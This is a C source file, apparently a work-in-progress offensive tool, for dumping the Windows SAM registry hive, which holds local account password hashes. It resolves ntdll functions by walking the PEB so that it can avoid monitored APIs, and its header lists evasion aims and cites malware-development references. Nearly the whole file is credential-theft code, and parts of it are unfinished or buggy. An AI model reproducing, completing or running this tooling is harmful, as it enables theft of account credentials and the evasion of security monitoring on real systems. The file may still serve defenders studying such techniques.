// Peter Gabaldon. https://pgj11.com/.
// Dumping SAM with clean indirect syscalls, custom call stacks, API hashing and walking PEB. Thanks to this resources
// https://github.com/Maldev-Academy/HellHall
// https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/
// https://0xdarkvortex.dev/hiding-in-plainsight/
// https://0xpat.github.io/Malware_development_part_4/

//#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <winternl.h>
#include <BaseTsd.h>
#include <ntstatus.h>
#include <comdef.h>

#include "Main.h"

// Globals "myFuncs"
myMessageBox pMyMessageBox;
myNtOpenKey pMyNtOpenKey;
myNtQueryKey pMyNtQueryKey;
myNtEnumerateKey pMyNtEnumerateKey;
myNtQueryValueKey pMyNtQueryValueKey;
myNtEnumerateValueKey pMyNtEnumerateValueKey;
myRtlInitUnicodeString pMyRtlInitUnicodeString;


// Get Address from Export in module by walking PEB. Thus, not calling GetModuleHandle + GetProcAddress.
FARPROC myGetProcAddress(PCHAR moduleName, PCHAR exportName) {
	PCHAR moduleMayus = (PCHAR)HeapAlloc(GetProcessHeap(), 0, strlen(moduleName) + 1);
	strncpy_s(moduleMayus, strlen(moduleName) + 1, moduleName, _TRUNCATE);
	CharUpperA(moduleMayus);

	PPEB pPEB = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA pLoaderData = pPEB->Ldr;
	PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;
	PLIST_ENTRY listCurrent = listHead->Flink;
	PVOID moduleAddress = NULL;
	do
	{
		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);
		PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
		WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);
		CharUpperA(dllName);
		if (strstr(dllName, moduleMayus))
		{
			moduleAddress = dllEntry->DllBase;
			HeapFree(GetProcessHeap(), 0, dllName);
			break;
		}
		HeapFree(GetProcessHeap(), 0, dllName);
		listCurrent = listCurrent->Flink;
	} while (listCurrent != listHead);

	if (moduleAddress == NULL) {
		return NULL;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)moduleAddress;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)moduleAddress + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PULONG pAddressOfFunctions = (PULONG)((PBYTE)moduleAddress + pExportDirectory->AddressOfFunctions);
	PULONG pAddressOfNames = (PULONG)((PBYTE)moduleAddress + pExportDirectory->AddressOfNames);
	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)moduleAddress + pExportDirectory->AddressOfNameOrdinals);

	FARPROC found = NULL;

	for (unsigned int i = 0; i < pExportDirectory->NumberOfNames; ++i) {
		PCSTR pFunctionName = (PSTR)((PBYTE)moduleAddress + pAddressOfNames[i]);
		if (strcmp(pFunctionName, exportName) == 0)
		{
			found = (FARPROC)((PBYTE)moduleAddress + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
	}
	HeapFree(GetProcessHeap(), 0, moduleMayus);

	return found;
}

/*
* NtOpenKey -> RegOpenKey, RegOpenKeyEx
* NtQueryKey -> RegQueryInfoKey
* NtEnumerateKey -> RegEnumerateKey, RegEnumerateKeyEx, RegEnumKey, RegEnumKeyEx
* NtQueryValueKey -> RegQueryValue, RegQueryValueEx
* NtEnumerateValueKey -> RegEnumValue
*
*/
void getSAM(PSAM samRegEntries[], PULONG len) {
	HANDLE key;
	HANDLE subKey;
	OBJECT_ATTRIBUTES attributes;
	OBJECT_ATTRIBUTES attributesSubKey;
	UNICODE_STRING UnicodeRegPath;
	UNICODE_STRING UnicodeRegPathSubKey;
	ULONG lengthBuff;
	KEY_FULL_INFORMATION keyInfo;
	KEY_FULL_INFORMATION keyInfoSubKeys;
	KEY_BASIC_INFORMATION keyInfoSubKeysBasic;
	KEY_VALUE_FULL_INFORMATION keyValuesSubKey;
	WCHAR RegPath[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users";
	DWORD maxLenOfNames;
	ULONG nEntries = 0;
	PSAM sams[MAX_SAM_ENTRIES];

	DWORD ret;

	pMyRtlInitUnicodeString(&UnicodeRegPath, RegPath);
	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	ret = pMyNtOpenKey(&key, KEY_READ, &attributes);

	if (ret != STATUS_SUCCESS) {
		exit(ret);
	}

	ret = pMyNtQueryKey(key, KeyFullInformation, &keyInfo, sizeof(keyInfo), &lengthBuff);

	if (ret != STATUS_SUCCESS) {
		exit(ret);
	}

	if (keyInfo.SubKeys) {
		for (int i = 0; i < keyInfo.SubKeys; i++) {
			maxLenOfNames = MAX_KEY_LENGTH;

			ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, &keyInfoSubKeysBasic, sizeof(keyInfoSubKeysBasic), &lengthBuff);

			if (ret != STATUS_SUCCESS) {
				exit(ret);
			}

			_bstr_t aux(keyInfoSubKeysBasic.Name);

			if (strncmp(aux, "00", strlen("00")) == 0) {
				CHAR aux2[MAX_PATH];
				strncat_s(aux2, MAX_PATH, aux, keyInfoSubKeysBasic.NameLength);

				WCHAR RegPathSubKey[MAX_PATH];
				size_t outSize;
				mbstowcs_s(&outSize, RegPathSubKey, MAX_PATH, aux2, strlen(aux2 + 1));

				pMyRtlInitUnicodeString(&UnicodeRegPathSubKey, RegPathSubKey);
				InitializeObjectAttributes(&attributesSubKey, &UnicodeRegPathSubKey, OBJ_CASE_INSENSITIVE, NULL, NULL);

				ret = pMyNtOpenKey(&subKey, KEY_READ, &attributesSubKey);

				if (ret != STATUS_SUCCESS) {
					exit(ret);
				}

				ret = pMyNtEnumerateKey(subKey, i, KeyFullInformation, &keyInfoSubKeys, sizeof(keyInfoSubKeys), &lengthBuff);

				if (ret != STATUS_SUCCESS) {
					exit(ret);
				}

				PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), NULL, sizeof(SAM));
				CopyMemory(sam->rid, keyInfoSubKeysBasic.Name, keyInfoSubKeysBasic.NameLength);
				getClasses(sam);
				for (int j = 0; j < keyInfoSubKeys.Values; j++) {
					ret = pMyNtEnumerateValueKey(subKey, j, KeyValueFullInformation, &keyValuesSubKey, sizeof(keyValuesSubKey), &lengthBuff);

					if (ret != STATUS_SUCCESS) {
						exit(ret);
					}

					_bstr_t aux(keyValuesSubKey.Name);
					if (strncmp(aux, "V", keyValuesSubKey.NameLength) == 0) {
						CopyMemory(sam->v, keyValuesSubKey.Name, keyValuesSubKey.NameLength);
					}

					if (strncmp(aux, "F", keyValuesSubKey.NameLength) == 0) {
						CopyMemory(sam->f, keyValuesSubKey.Name, keyValuesSubKey.NameLength);
					}
				}
				sams[nEntries] = sam;
				nEntries++;
			}
		}
	}

	CopyMemory(len, &nEntries, sizeof(ULONG));
	if (samRegEntries != NULL) {
		for (int i = 0; i < nEntries; i++) {
			CopyMemory(samRegEntries[i], sams[i], sizeof(SAM));
		}
	}
}

// TODO
void getClasses(PSAM samRegEntry) {
	return;
}

void getBootKey(PSAM samRegEntry, int* bootKeyRet) {
	unsigned int magics[16] = { 8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7 };
	unsigned int bootKey[16];
	for (int i = 0; i < 16; i++) {
		PCHAR auxStr = (PCHAR)HeapAlloc(GetProcessHeap(), 0, 3);
		auxStr[0] = samRegEntry->classes[i * 2];
		auxStr[1] = samRegEntry->classes[(i * 2) + 1];
		auxStr[2] = '\0';

		bootKey[i] = strtol(auxStr, NULL, 16);
	}
	memcpy(bootKeyRet, bootKey, 16);
}

int main(int argc, char** argv) {
	pMyMessageBox = (myMessageBox)myGetProcAddress((PCHAR)"user32.dll", (PCHAR)"MessageBoxA");
	pMyNtOpenKey = (myNtOpenKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtOpenKey");
	pMyNtQueryKey = (myNtQueryKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtQueryKey");
	pMyNtEnumerateKey = (myNtEnumerateKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtEnumerateKey");
	pMyNtQueryValueKey = (myNtQueryValueKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtQueryValueKey");
	pMyNtEnumerateValueKey = (myNtEnumerateValueKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtEnumerateValueKey");
	pMyRtlInitUnicodeString = (myRtlInitUnicodeString)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"RtlInitUnicodeString");

	if (pMyMessageBox != NULL) {
		pMyMessageBox(NULL, (LPCTSTR)"TEST", (LPCTSTR)"TEST", MB_OK);
	}

	// Time to debug as always works at first :D
	ULONG len;
	getSAM(NULL, &len);
}